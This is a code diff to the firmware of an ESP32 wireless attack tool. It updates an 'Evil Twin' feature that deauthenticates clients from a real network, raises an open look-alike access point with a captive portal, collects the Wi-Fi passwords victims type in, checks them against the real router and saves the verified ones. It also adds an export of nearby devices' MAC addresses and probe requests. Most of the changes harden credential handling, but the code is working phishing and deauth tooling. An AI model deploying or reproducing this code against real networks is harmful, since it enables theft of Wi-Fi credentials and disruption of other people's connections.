@@ -140,7 +140,7 @@
 #endif
 
 //Version number
-#define JANOS_VERSION "1.7.12"
+#define JANOS_VERSION "1.7.13"
 
 #define OTA_GITHUB_OWNER "Smethan"
 #define OTA_GITHUB_REPO "projectZero"
@@ -276,6 +276,7 @@ typedef struct {
     int rssi;
     sniffer_client_t clients[MAX_CLIENTS_PER_AP];
     int client_count;
+    uint32_t packet_count;
     uint32_t last_seen;
 } sniffer_ap_t;
 
@@ -400,6 +401,8 @@ static volatile bool sniff_oled_dirty = false;
 static TaskHandle_t sniffer_channel_task_handle = NULL;
 static uint32_t sniffer_packet_counter = 0;
 static uint32_t sniffer_last_debug_packet = 0;
+static bool sniffer_session_valid = false;
+static int64_t sniffer_session_completed_us = 0;
 
 // PCAPNG capture state
 typedef enum {
@@ -517,6 +520,10 @@ static int64_t hs_scan_completed_us;
 typedef struct {
     char token[33];
     uint16_t count;
+    bool intel_available;
+    uint32_t intel_packets;
+    uint16_t intel_probes;
+    uint32_t intel_age_ms;
     wifi_ap_record_t records[MAX_AP_CNT];
 } hs_scan_snapshot_t;
 static hs_scan_snapshot_t hs_scan_snapshot;
@@ -1965,6 +1972,7 @@ static int cmd_set_gps_position(int argc, char **argv);
 static int cmd_set_gps_position_cap(int argc, char **argv);
 static int cmd_start_wardrive(int argc, char **argv);
 static int cmd_start_sniffer(int argc, char **argv);
+static int cmd_start_sniffer_all(int argc, char **argv);
 static int cmd_start_sniffer_noscan(int argc, char **argv);
 static int cmd_packet_monitor(int argc, char **argv);
 static int cmd_start_ap_locator(int argc, char **argv);
@@ -2092,11 +2100,15 @@ static esp_err_t android_captive_handler(httpd_req_t *req);
 static esp_err_t captive_portal_handler(httpd_req_t *req);
 static esp_err_t ios_captive_handler(httpd_req_t *req);
 static esp_err_t captive_detection_handler(httpd_req_t *req);
+static void evil_twin_clear_credentials(bool clear_ssid);
 // Sniffer functions
 static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
 static void sniffer_process_scan_results(void);
 static void sniffer_merge_scan_results(void);
 static void sniffer_init_selected_networks(void);
+static void sniffer_begin_session(void);
+static int sniffer_find_ap(const uint8_t *bssid);
+static unsigned sniffer_probe_count_for_ssid(const uint8_t *ssid);
 static void sniffer_channel_hop(void);
 static void channel_view_task(void *pvParameters);
 static void channel_view_stop(void);
@@ -2296,7 +2308,7 @@ static void wifi_event_handler(void *event_handler_arg,
                      e->bssid[0], e->bssid[1], e->bssid[2], e->bssid[3], e->bssid[4], e->bssid[5]);
             
             if (evilTwinSSID != NULL && evilTwinPassword != NULL) {
-                MY_LOG_INFO(TAG, "Wi-Fi: connected to SSID='%s' with password='%s'", evilTwinSSID, evilTwinPassword);
+                MY_LOG_INFO(TAG, "Wi-Fi: Evil Twin credential verified for SSID='%s'", evilTwinSSID);
             } else {
                 MY_LOG_INFO(TAG, "Wi-Fi: connected to SSID='%s'", (const char*)e->ssid);
             }
@@ -2362,6 +2374,7 @@ static void wifi_event_handler(void *event_handler_arg,
                     MY_LOG_INFO(TAG, "Saving verified password to SD card...");
                     save_evil_twin_password(evilTwinSSID, evilTwinPassword);
                 }
+                evil_twin_clear_credentials(true);
             }
             
             applicationState = IDLE;
@@ -2465,6 +2478,14 @@ static void wifi_event_handler(void *event_handler_arg,
             if (hs_scan_pending) {
                 memcpy(hs_scan_snapshot.token, hs_scan_token, sizeof(hs_scan_snapshot.token));
                 hs_scan_snapshot.count = scan_records_ok ? g_scan_count : 0;
+                hs_scan_snapshot.intel_available = sniffer_session_valid;
+                hs_scan_snapshot.intel_packets = sniffer_packet_counter;
+                hs_scan_snapshot.intel_probes = (uint16_t)probe_request_count;
+                hs_scan_snapshot.intel_age_ms =
+                    sniffer_session_valid && sniffer_session_completed_us > 0
+                    ? (uint32_t)((esp_timer_get_time() -
+                                  sniffer_session_completed_us) / 1000)
+                    : 0;
                 if (hs_scan_snapshot.count)
                     memcpy(hs_scan_snapshot.records, g_scan_results,
                            hs_scan_snapshot.count * sizeof(g_scan_results[0]));
@@ -2558,6 +2579,8 @@ static void wifi_event_handler(void *event_handler_arg,
                     
                     // Mark password as wrong for portal feedback
                     last_password_wrong = true;
+                    MY_LOG_INFO(TAG, "Evil Twin credential verification failed.");
+                    evil_twin_clear_credentials(false);
                     
                     // Resume deauth attack since password was wrong
                     if (!deauth_attack_active && deauth_attack_task_handle == NULL) {
@@ -3200,16 +3223,66 @@ static void ip_event_handler(void *event_handler_arg,
     }
 }
 
+static void secure_free_string(char **value) {
+    if (!value || !*value) return;
+    size_t len = strlen(*value);
+    volatile char *p = (volatile char *)*value;
+    while (len--) *p++ = 0;
+    free(*value);
+    *value = NULL;
+}
+
+static void evil_twin_clear_credentials(bool clear_ssid) {
+    secure_free_string(&evilTwinPassword);
+    if (clear_ssid) secure_free_string(&evilTwinSSID);
+}
+
+static void evil_twin_abort_start(esp_netif_t *ap_netif) {
+    portal_active = false;
+    if (dns_server_task_handle != NULL) {
+        vTaskDelete(dns_server_task_handle);
+        dns_server_task_handle = NULL;
+    }
+    if (dns_server_socket >= 0) {
+        close(dns_server_socket);
+        dns_server_socket = -1;
+    }
+    if (portal_server != NULL) {
+        httpd_stop(portal_server);
+        portal_server = NULL;
+    }
+    if (ap_netif != NULL) {
+        esp_netif_dhcps_stop(ap_netif);
+        esp_err_t mode_ret = esp_wifi_set_mode(WIFI_MODE_STA);
+        if (mode_ret != ESP_OK) {
+            MY_LOG_INFO(TAG, "Failed to disable aborted Evil Twin AP: %s",
+                        esp_err_to_name(mode_ret));
+        }
+    }
+    deauth_attack_active = false;
+    deauth_attack_task_handle = NULL;
+    target_bssid_count = 0;
+    memset(target_bssids, 0, MAX_TARGET_BSSIDS * sizeof(*target_bssids));
+    evil_twin_clear_credentials(true);
+    applicationState = IDLE;
+}
+
 // --- Password verification function (used by portal) ---
 static void verify_password(const char* password) {
+    if (password == NULL || evilTwinSSID == NULL || target_bssid_count <= 0) {
+        MY_LOG_INFO(TAG, "Evil Twin verification rejected: missing candidate or target.");
+        return;
+    }
+    secure_free_string(&evilTwinPassword);
     evilTwinPassword = malloc(strlen(password) + 1);
     if (evilTwinPassword != NULL) {
         strcpy(evilTwinPassword, password);
     } else {
         ESP_LOGW(TAG,"Malloc error for password");
+        return;
     }
 
-    MY_LOG_INFO(TAG, "Password received: %s", password);
+    MY_LOG_INFO(TAG, "Evil Twin form submission received; verifying candidate.");
 
     {
         char et_l2[64];
@@ -3253,12 +3326,15 @@ static void verify_password(const char* password) {
     sta_config.sta.ssid[sizeof(sta_config.sta.ssid) - 1] = '\0'; // null-terminate
     strncpy((char *)sta_config.sta.password, password, sizeof(sta_config.sta.password));
     sta_config.sta.password[sizeof(sta_config.sta.password) - 1] = '\0'; // null-terminate
+    memcpy(sta_config.sta.bssid, target_bssids[0].bssid, 6);
+    sta_config.sta.bssid_set = 1;
     esp_wifi_set_config(WIFI_IF_STA, &sta_config);
     vTaskDelay(pdMS_TO_TICKS(500));
-    MY_LOG_INFO(TAG, "Attempting to connect to SSID='%s' with password='%s'", evilTwinSSID, password);
+    MY_LOG_INFO(TAG, "Attempting BSSID-pinned verification for SSID='%s'", evilTwinSSID);
     connectAttemptCount = 0;
     MY_LOG_INFO(TAG, "Attempting to connect, connectAttemptCount=%d", connectAttemptCount);
     esp_wifi_connect();
+    memset(&sta_config, 0, sizeof(sta_config));
 }
 
 static void ota_load_channel_from_nvs(void) {
@@ -5111,6 +5187,17 @@ static bool hs_scan_event(const char *token,const char *kind,const char *error,u
         kind,token,count,error?error:"");
     return n>0&&n<(int)sizeof(line)&&serial_output(line,(unsigned)n,250);
 }
+static bool hs_scan_done_event(const hs_scan_snapshot_t *snapshot) {
+    char line[320];
+    int n=snprintf(line,sizeof(line),
+        "\nHST:{\"v\":1,\"kind\":\"scan_done\",\"scan\":\"%s\",\"count\":%u,\"error\":\"\",\"intel\":%s,\"packets\":%lu,\"probes\":%u,\"intel_age_ms\":%lu}\n",
+        snapshot->token,(unsigned)snapshot->count,
+        snapshot->intel_available?"true":"false",
+        (unsigned long)snapshot->intel_packets,
+        (unsigned)snapshot->intel_probes,
+        (unsigned long)snapshot->intel_age_ms);
+    return n>0&&n<(int)sizeof(line)&&serial_output(line,(unsigned)n,250);
+}
 static void hs_scan_release_event_owner(void) {
     /* The scan-done handler has already consumed the SDK-owned AP list and
      * copied any HST result. Release every replacement barrier before its
@@ -5138,11 +5225,15 @@ static void hs_scan_complete(bool success) {
     for(unsigned i=0;i<snapshot_count;i++) {
         const wifi_ap_record_t *ap=&hs_scan_snapshot.records[i];
         char ssid[65],line[384];static const char hex[]="0123456789abcdef";
+        int intel_index=sniffer_find_ap(ap->bssid);
+        unsigned clients=intel_index>=0?(unsigned)sniffer_aps[intel_index].client_count:0;
+        unsigned long packets=intel_index>=0?(unsigned long)sniffer_aps[intel_index].packet_count:0;
+        unsigned probes=sniffer_probe_count_for_ssid(ap->ssid);
         unsigned len=strnlen((const char *)ap->ssid,32);
         for(unsigned j=0;j<len;j++){ssid[j*2]=hex[ap->ssid[j]>>4];ssid[j*2+1]=hex[ap->ssid[j]&15];}
         ssid[len*2]=0;
-        int n=snprintf(line,sizeof(line),"\nHST:{\"v\":1,\"kind\":\"ap\",\"scan\":\"%s\",\"seq\":%u,\"bssid\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"ssid_hex\":\"%s\",\"channel\":%u,\"rssi\":%d,\"auth\":%u}\n",
-            token,i+1,ap->bssid[0],ap->bssid[1],ap->bssid[2],ap->bssid[3],ap->bssid[4],ap->bssid[5],ssid,ap->primary,ap->rssi,(unsigned)ap->authmode);
+        int n=snprintf(line,sizeof(line),"\nHST:{\"v\":1,\"kind\":\"ap\",\"scan\":\"%s\",\"seq\":%u,\"bssid\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"ssid_hex\":\"%s\",\"channel\":%u,\"rssi\":%d,\"auth\":%u,\"clients\":%u,\"packets\":%lu,\"probes\":%u}\n",
+            token,i+1,ap->bssid[0],ap->bssid[1],ap->bssid[2],ap->bssid[3],ap->bssid[4],ap->bssid[5],ssid,ap->primary,ap->rssi,(unsigned)ap->authmode,clients,packets,probes);
         int64_t left_ms=(output_deadline-esp_timer_get_time())/1000;
         unsigned timeout=left_ms>250?250:left_ms>0?(unsigned)left_ms:0;
         if(operation_stop_requested||n<=0||n>=(int)sizeof(line)||!timeout||
@@ -5161,12 +5252,13 @@ static void hs_scan_complete(bool success) {
     hs_scan_completed_us=esp_timer_get_time();hs_scan_pending=false;
     hs_scan_ready=true;
     hs_scan_release_event_owner();
-    if(!hs_scan_event(token,"scan_done",NULL,snapshot_count))hs_scan_ready=false;
+    if(!hs_scan_done_event(&hs_scan_snapshot))hs_scan_ready=false;
 }
 static int cmd_hs_scan(int argc,char **argv) {
     if(argc!=2||!argv[1][0]||strlen(argv[1])>32)return 1;
     for(const char *p=argv[1];*p;p++)if(!isalnum((unsigned char)*p)&&*p!='-'&&*p!='_')return 1;
     if(g_scan_in_progress||hs_scan_pending||g_scan_cancel_pending||
+       sniffer_active||sniffer_scan_phase||
        atomic_load(&hs_scan_output_active)||atomic_load(&handshake_cleanup_active)||
        handshake_attack_active||handshake_attack_task_handle) {
         hs_scan_event(argv[1],"scan_error","busy",0);return 1;
@@ -11472,11 +11564,25 @@ static int cmd_start_evil_twin(int argc, char **argv) {
         MY_LOG_INFO(TAG, "Deauth attack already running. Use 'stop' to stop it first.");
         return 1;
     }
+
+    if (portal_active || portal_server != NULL) {
+        MY_LOG_INFO(TAG, "Portal is already active. Use 'stop' first.");
+        return 1;
+    }
     
     // Reset stop flag at the beginning of operation
     operation_stop_requested = false;
 
-    if (g_selected_count > 0) {
+    bool selection_valid = g_scan_done && g_selected_count > 0;
+    for (int i = 0; selection_valid && i < g_selected_count; i++) {
+        if (g_selected_indices[i] < 0 ||
+            g_selected_indices[i] >= (int)g_scan_count) {
+            selection_valid = false;
+        }
+    }
+    if (selection_valid) {
+        target_bssid_count = 0;
+        memset(target_bssids, 0, MAX_TARGET_BSSIDS * sizeof(*target_bssids));
         // Set application state based on attack type
         if (onlyDeauth) {
             applicationState = DEAUTH;
@@ -11487,12 +11593,15 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             portal_connected_clients = 0;
         }
 
+        evil_twin_clear_credentials(true);
         const char *sourceSSID = (const char *)g_scan_results[g_selected_indices[0]].ssid;
         evilTwinSSID = malloc(strlen(sourceSSID) + 1); 
         if (evilTwinSSID != NULL) {
             strcpy(evilTwinSSID, sourceSSID);
         } else {
             ESP_LOGW(TAG,"Malloc error 4 SSID");
+            evil_twin_abort_start(NULL);
+            return 1;
         }
 
         // Start portal before starting deauth attack
@@ -11503,7 +11612,7 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             esp_netif_t *ap_netif = ensure_ap_mode();
             if (!ap_netif) {
                 MY_LOG_INFO(TAG, "Failed to enable AP mode");
-                applicationState = IDLE;
+                evil_twin_abort_start(NULL);
                 return 1;
             }
             
@@ -11518,7 +11627,9 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             
             esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
             if (ret != ESP_OK) {
-                applicationState = IDLE;
+                MY_LOG_INFO(TAG, "Failed to set AP IP info: %s",
+                            esp_err_to_name(ret));
+                evil_twin_abort_start(ap_netif);
                 return 1;
             }
             
@@ -11527,7 +11638,7 @@ static int cmd_start_evil_twin(int argc, char **argv) {
                 .ap = {
                     .ssid = "",
                     .ssid_len = 0,
-                    .channel = target_bssid_count > 0 ? target_bssids[0].channel : 1,
+                    .channel = g_scan_results[g_selected_indices[0]].primary,
                     .password = "",
                     .max_connection = 4,
                     .authmode = WIFI_AUTH_OPEN
@@ -11549,14 +11660,16 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             // in the client's network list after deauth from the real AP.
             if (ret != ESP_OK) {
                 MY_LOG_INFO(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
-                applicationState = IDLE;
+                evil_twin_abort_start(ap_netif);
                 return 1;
             }
             
             // Start DHCP server
             ret = esp_netif_dhcps_start(ap_netif);
             if (ret != ESP_OK) {
-                applicationState = IDLE;
+                MY_LOG_INFO(TAG, "Failed to start DHCP server: %s",
+                            esp_err_to_name(ret));
+                evil_twin_abort_start(ap_netif);
                 return 1;
             }
             
@@ -11573,9 +11686,7 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             esp_err_t http_ret = httpd_start(&portal_server, &config);
             if (http_ret != ESP_OK) {
                 MY_LOG_INFO(TAG, "Failed to start HTTP server: %s", esp_err_to_name(http_ret));
-                // Stop DHCP before returning
-                esp_netif_dhcps_stop(ap_netif);
-                applicationState = IDLE;
+                evil_twin_abort_start(ap_netif);
                 return 1;
             }
             
@@ -11689,10 +11800,7 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             
             if (dns_result != pdPASS) {
                 MY_LOG_INFO(TAG, "Failed to create DNS server task");
-                httpd_stop(portal_server);
-                portal_server = NULL;
-                portal_active = false;
-                applicationState = IDLE;
+                evil_twin_abort_start(ap_netif);
                 return 1;
             }
             
@@ -11731,13 +11839,17 @@ static int cmd_start_evil_twin(int argc, char **argv) {
         
         if (result != pdPASS) {
             MY_LOG_INFO(TAG, "Failed to create deauth attack task!");
-            deauth_attack_active = false;
-            applicationState = IDLE;
+            evil_twin_abort_start(
+                esp_netif_get_handle_from_ifkey("WIFI_AP_DEF"));
             return 1;
         }
+        MY_LOG_INFO(TAG, "Evil Twin started successfully.");
         
     } else {
-        MY_LOG_INFO(TAG,"Evil twin: no selected APs (use select_networks).");
+        MY_LOG_INFO(TAG,"Evil twin: no valid selected APs (use select_networks).");
+        evil_twin_clear_credentials(true);
+        applicationState = IDLE;
+        return 1;
     }
     return 0;
 }
@@ -12145,6 +12257,7 @@ static int stop_operations(bool reset_wifi) {
     if (sniffer_active) {
         sniffer_active = false;
         sniffer_scan_phase = false;
+        sniffer_session_completed_us = esp_timer_get_time();
         esp_wifi_set_promiscuous(false);
         
         // Stop channel hopping task
@@ -12398,6 +12511,7 @@ static int stop_operations(bool reset_wifi) {
             portalSSID = NULL;
         }
     }
+    evil_twin_clear_credentials(true);
     
     // Stop ARP ban if active
     if (arp_ban_active || arp_ban_task_handle != NULL) {
@@ -15325,8 +15439,10 @@ static int cmd_start_sniffer(int argc, char **argv) {
         MY_LOG_INFO(TAG, "Sniffer already active. Use 'stop' to stop it first.");
         return 1;
     }
-    
-    // Note: Sniffer results are preserved between sessions. Use 'clear_sniffer_results' to clear them.
+
+    /* Results remain available after stop, but each start is a new bounded
+     * observation window for picker metrics. */
+    sniffer_begin_session();
     
     // Check if networks were selected
     if (g_selected_count > 0 && g_scan_done) {
@@ -15345,6 +15461,7 @@ static int cmd_start_sniffer(int argc, char **argv) {
             MY_LOG_INFO(TAG, "Failed to initialize selected networks for sniffer");
             sniffer_active = false;
             sniffer_selected_mode = false;
+            sniffer_session_valid = false;
             return 1;
         }
         
@@ -15395,6 +15512,7 @@ static int cmd_start_sniffer(int argc, char **argv) {
             sniffer_active = false;
             sniffer_scan_phase = false;
             sniffer_selected_mode = false;
+            sniffer_session_valid = false;
             
             // Return LED to idle (ignore errors if LED is in invalid state)
             led_err = led_set_idle();
@@ -15411,6 +15529,13 @@ static int cmd_start_sniffer(int argc, char **argv) {
     }
     
     return 0;
+}
+
+static int cmd_start_sniffer_all(int argc, char **argv) {
+    (void)argc; (void)argv;
+    g_selected_count = 0;
+    memset(g_selected_indices, 0, sizeof(g_selected_indices));
+    return cmd_start_sniffer(1, argv);
 }
 
 static void pcapng_put_le16(uint8_t *dest, uint16_t value) {
@@ -15697,15 +15822,15 @@ static int cmd_start_sniffer_noscan(int argc, char **argv) {
     }
     
     MY_LOG_INFO(TAG, "Starting sniffer using existing scan results (%u networks)...", g_scan_count);
-    
-    // Note: Sniffer results are preserved between sessions. Use 'clear_sniffer_results' to clear them.
-    bool had_sniffer_data = (sniffer_ap_count > 0 || probe_request_count > 0);
+
+    bool had_sniffer_data = sniffer_ap_count > 0;
+    sniffer_begin_session();
     
     sniffer_active = true;
     sniffer_scan_phase = false;
     sniffer_selected_mode = false;
     
-    // Process existing scan results while preserving sniffer data when possible
+    // Reuse the AP catalog while keeping this session's metrics clean.
     if (had_sniffer_data) {
         sniffer_merge_scan_results();
     } else {
@@ -15891,6 +16016,77 @@ static int cmd_show_sniffer_results_vendor(int argc, char **argv) {
     return 0;
 }
 
+/* Structured host export for WatchDogsGo.  Legacy human-readable commands
+ * remain unchanged for Flipper/terminal users. */
+static int cmd_show_sniffer_intel(int argc, char **argv) {
+    if (argc != 2 || !argv[1][0] || strlen(argv[1]) > 32) return 1;
+    if (sniffer_active || sniffer_scan_phase) return 1;
+    for (const char *p = argv[1]; *p; p++) {
+        if (!isalnum((unsigned char)*p) && *p != '-' && *p != '_') return 1;
+    }
+
+    uint32_t age_ms = sniffer_session_valid && sniffer_session_completed_us > 0
+        ? (uint32_t)((esp_timer_get_time() - sniffer_session_completed_us) / 1000)
+        : 0;
+    int ap_total = sniffer_session_valid ? sniffer_ap_count : 0;
+    int probe_total = sniffer_session_valid ? probe_request_count : 0;
+    uint32_t packet_total = sniffer_session_valid ? sniffer_packet_counter : 0;
+    char line[384];
+    int n = snprintf(line, sizeof(line),
+        "\nSNIFF:{\"v\":1,\"kind\":\"summary\",\"session\":\"%s\",\"available\":%s,\"packets\":%lu,\"aps\":%d,\"probes\":%d,\"age_ms\":%lu}\n",
+        argv[1], sniffer_session_valid ? "true" : "false",
+        (unsigned long)packet_total, ap_total, probe_total,
+        (unsigned long)age_ms);
+    if (n <= 0 || n >= (int)sizeof(line) ||
+        !serial_output(line, (unsigned)n, 250)) return 1;
+
+    static const char hex[] = "0123456789abcdef";
+    for (int i = 0; i < ap_total; i++) {
+        const sniffer_ap_t *ap = &sniffer_aps[i];
+        char ssid_hex[65];
+        unsigned len = strnlen(ap->ssid, 32);
+        for (unsigned j = 0; j < len; j++) {
+            uint8_t value = (uint8_t)ap->ssid[j];
+            ssid_hex[j * 2] = hex[value >> 4];
+            ssid_hex[j * 2 + 1] = hex[value & 15];
+        }
+        ssid_hex[len * 2] = 0;
+        n = snprintf(line, sizeof(line),
+            "\nSNIFF:{\"v\":1,\"kind\":\"ap\",\"session\":\"%s\",\"seq\":%d,\"bssid\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"ssid_hex\":\"%s\",\"channel\":%u,\"clients\":%d,\"packets\":%lu,\"probes\":%u}\n",
+            argv[1], i + 1, ap->bssid[0], ap->bssid[1], ap->bssid[2],
+            ap->bssid[3], ap->bssid[4], ap->bssid[5], ssid_hex,
+            ap->channel, ap->client_count, (unsigned long)ap->packet_count,
+            sniffer_probe_count_for_ssid((const uint8_t *)ap->ssid));
+        if (n <= 0 || n >= (int)sizeof(line) ||
+            !serial_output(line, (unsigned)n, 250)) return 1;
+    }
+
+    for (int i = 0; i < probe_total; i++) {
+        const probe_request_t *probe = &probe_requests[i];
+        char ssid_hex[65];
+        unsigned len = strnlen(probe->ssid, 32);
+        for (unsigned j = 0; j < len; j++) {
+            uint8_t value = (uint8_t)probe->ssid[j];
+            ssid_hex[j * 2] = hex[value >> 4];
+            ssid_hex[j * 2 + 1] = hex[value & 15];
+        }
+        ssid_hex[len * 2] = 0;
+        n = snprintf(line, sizeof(line),
+            "\nSNIFF:{\"v\":1,\"kind\":\"probe\",\"session\":\"%s\",\"seq\":%d,\"mac\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"ssid_hex\":\"%s\",\"rssi\":%d}\n",
+            argv[1], i + 1, probe->mac[0], probe->mac[1], probe->mac[2],
+            probe->mac[3], probe->mac[4], probe->mac[5], ssid_hex,
+            probe->rssi);
+        if (n <= 0 || n >= (int)sizeof(line) ||
+            !serial_output(line, (unsigned)n, 250)) return 1;
+    }
+
+    n = snprintf(line, sizeof(line),
+        "\nSNIFF:{\"v\":1,\"kind\":\"done\",\"session\":\"%s\",\"aps\":%d,\"probes\":%d}\n",
+        argv[1], ap_total, probe_total);
+    return n > 0 && n < (int)sizeof(line) &&
+           serial_output(line, (unsigned)n, 250) ? 0 : 1;
+}
+
 static int cmd_clear_sniffer_results(int argc, char **argv) {
     (void)argc; (void)argv;
     
@@ -15901,6 +16097,8 @@ static int cmd_clear_sniffer_results(int argc, char **argv) {
     memset(probe_requests, 0, MAX_PROBE_REQUESTS * sizeof(probe_request_t));
     sniffer_packet_counter = 0;
     sniffer_last_debug_packet = 0;
+    sniffer_session_valid = false;
+    sniffer_session_completed_us = 0;
     
     MY_LOG_INFO(TAG, "Sniffer results cleared.");
     return 0;
@@ -17548,6 +17746,23 @@ static int cmd_set_html_end(int argc, char **argv)
     return 0;
 }
 
+static int cmd_clear_html(int argc, char **argv)
+{
+    (void)argc; (void)argv;
+    if (html_b64_buf) {
+        heap_caps_free(html_b64_buf);
+        html_b64_buf = NULL;
+    }
+    html_b64_len = html_b64_cap = 0;
+    html_b64_active = false;
+    if (custom_portal_html) {
+        free(custom_portal_html);
+        custom_portal_html = NULL;
+    }
+    MY_LOG_INFO(TAG, "Custom portal HTML cleared; firmware default is active.");
+    return 0;
+}
+
 static void gps_raw_task(void *pvParameters) {
     (void)pvParameters;
 
@@ -18233,7 +18448,7 @@ static esp_err_t login_handler(httpd_req_t *req) {
     }
     buf[ret] = '\0';
     
-    MY_LOG_INFO(TAG, "Received POST data: %s", buf);
+    MY_LOG_INFO(TAG, "Portal form submission received.");
     
     // Parse password from POST data
     char *password_start = strstr(buf, "password=");
@@ -18260,9 +18475,6 @@ static esp_err_t login_handler(httpd_req_t *req) {
         }
         decoded_password[decoded_len] = '\0';
         
-        // Log the password
-        MY_LOG_INFO(TAG, "Portal password received: %s", decoded_password);
-        
         // If in evil twin mode, verify the password (save will happen after verification)
         if ((applicationState == DEAUTH_EVIL_TWIN || applicationState == EVIL_TWIN_PASS_CHECK) &&
             evilTwinSSID != NULL) {
@@ -18271,7 +18483,9 @@ static esp_err_t login_handler(httpd_req_t *req) {
             // Regular portal mode - save all form data to portals.txt
             save_portal_data(portalSSID, buf);
         }
+        memset(decoded_password, 0, sizeof(decoded_password));
     }
+    memset(buf, 0, sizeof(buf));
     
     // Send response based on previous password attempt result
     const char* response;
@@ -18355,8 +18569,6 @@ static esp_err_t get_handler(httpd_req_t *req) {
                     }
                     decoded_password[decoded_len] = '\0';
                     
-                    MY_LOG_INFO(TAG, "Password: %s", decoded_password);
-                    
                     // If in evil twin mode, verify the password (save will happen after verification)
                     if ((applicationState == DEAUTH_EVIL_TWIN || applicationState == EVIL_TWIN_PASS_CHECK) &&
                         evilTwinSSID != NULL) {
@@ -18366,8 +18578,10 @@ static esp_err_t get_handler(httpd_req_t *req) {
                         // For GET requests, query_string has same format as POST data
                         save_portal_data(portalSSID, query_string);
                     }
+                    memset(decoded_password, 0, sizeof(decoded_password));
                 }
             }
+            memset(query_string, 0, query_len + 1);
             free(query_string);
         }
     }
@@ -18458,8 +18672,6 @@ static esp_err_t save_handler(httpd_req_t *req) {
         }
         decoded_password[decoded_len] = '\0';
         
-        MY_LOG_INFO(TAG, "Password: %s", decoded_password);
-        
         // If in evil twin mode, verify the password (save will happen after verification)
         if ((applicationState == DEAUTH_EVIL_TWIN || applicationState == EVIL_TWIN_PASS_CHECK) &&
             evilTwinSSID != NULL) {
@@ -18468,7 +18680,9 @@ static esp_err_t save_handler(httpd_req_t *req) {
             // Regular portal mode - save all form data to portals.txt
             save_portal_data(portalSSID, buf);
         }
+        memset(decoded_password, 0, sizeof(decoded_password));
     }
+    memset(buf, 0, sizeof(buf));
     
     // Send response
     const char* response;
@@ -20923,6 +21137,15 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(sw_register_command(&sniffer_cmd));
 
+    const esp_console_cmd_t sniffer_all_cmd = {
+        .command = "start_sniffer_all",
+        .help = "Starts an all-network sniffer session and clears stale target selection",
+        .hint = NULL,
+        .func = &cmd_start_sniffer_all,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(sw_register_command(&sniffer_all_cmd));
+
     const esp_console_cmd_t sniffer_noscan_cmd = {
         .command = "start_sniffer_noscan",
         .help = "Starts sniffer using existing scan results (requires prior scan_networks)",
@@ -20969,6 +21192,15 @@ static void register_commands(void)
         .argtable = NULL
     };
     ESP_ERROR_CHECK(sw_register_command(&show_sniffer_vendor_cmd));
+
+    const esp_console_cmd_t show_sniffer_intel_cmd = {
+        .command = "show_sniffer_intel",
+        .help = "Structured sniffer AP/probe export for WatchDogsGo: show_sniffer_intel <session>",
+        .hint = "<session>",
+        .func = &cmd_show_sniffer_intel,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(sw_register_command(&show_sniffer_intel_cmd));
 
     const esp_console_cmd_t clear_sniffer_cmd = {
         .command = "clear_sniffer_results",
@@ -21812,6 +22044,15 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(sw_register_command(&set_html_end_cmd));
 
+    const esp_console_cmd_t clear_html_cmd = {
+        .command = "clear_html",
+        .help = "Clear custom portal HTML and restore the firmware default",
+        .hint = NULL,
+        .func = &cmd_clear_html,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(sw_register_command(&clear_html_cmd));
+
     // BLE Scanner commands
     const esp_console_cmd_t scan_bt_cmd = {
         .command = "scan_bt",
@@ -22567,6 +22808,49 @@ static bool is_own_device_mac(const uint8_t *mac) {
     return false;
 }
 
+static int sniffer_find_ap(const uint8_t *bssid) {
+    if (!bssid || !sniffer_aps) return -1;
+    for (int i = 0; i < sniffer_ap_count; i++) {
+        if (memcmp(sniffer_aps[i].bssid, bssid, 6) == 0) return i;
+    }
+    return -1;
+}
+
+/* Probe requests do not contain a destination BSSID.  Associate them with
+ * picker rows by exact requested SSID and expose the value as a count of
+ * unique station/SSID pairs, never as an AP-addressed packet count. */
+static unsigned sniffer_probe_count_for_ssid(const uint8_t *ssid) {
+    if (!ssid || !ssid[0] || !probe_requests) return 0;
+    unsigned count = 0;
+    for (int i = 0; i < probe_request_count; i++) {
+        if (strncmp(probe_requests[i].ssid, (const char *)ssid,
+                    sizeof(probe_requests[i].ssid)) == 0) {
+            count++;
+        }
+    }
+    return count;
+}
+
+/* Keep AP identities so a stopped session can still be reported, but make
+ * every new run a clean observation window.  Client and probe counts from an
+ * older run must not be presented as if they were seen in the latest scan. */
+static void sniffer_begin_session(void) {
+    sniffer_packet_counter = 0;
+    sniffer_last_debug_packet = 0;
+    sniff_oled_packets = 0;
+    probe_request_count = 0;
+    if (probe_requests)
+        memset(probe_requests, 0, MAX_PROBE_REQUESTS * sizeof(*probe_requests));
+    for (int i = 0; i < sniffer_ap_count; i++) {
+        if (!sniffer_aps) break;
+        sniffer_aps[i].client_count = 0;
+        sniffer_aps[i].packet_count = 0;
+        memset(sniffer_aps[i].clients, 0, sizeof(sniffer_aps[i].clients));
+    }
+    sniffer_session_valid = true;
+    sniffer_session_completed_us = 0;
+}
+
 
 static void add_client_to_ap(int ap_index, const uint8_t *client_mac, int rssi) {
     static uint32_t add_client_counter = 0;
@@ -23083,12 +23367,6 @@ static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t 
         printf("Sniffer packet count: %lu\n", sniffer_packet_counter);
     }
     
-    // Perform packet-based channel hopping (10 packets OR time-based task will handle it)
-    if ((sniffer_packet_counter % 10) == 0) {
-        //MY_LOG_INFO(TAG, "Sniffer: Packet-based channel hop (10 packets)");
-        sniffer_channel_hop();
-    }
-    
     // Throttle debug logging - only every 100th packet when debug is on
     bool should_debug = sniff_debug && ((sniffer_packet_counter - sniffer_last_debug_packet) >= 100);
     if (should_debug) {
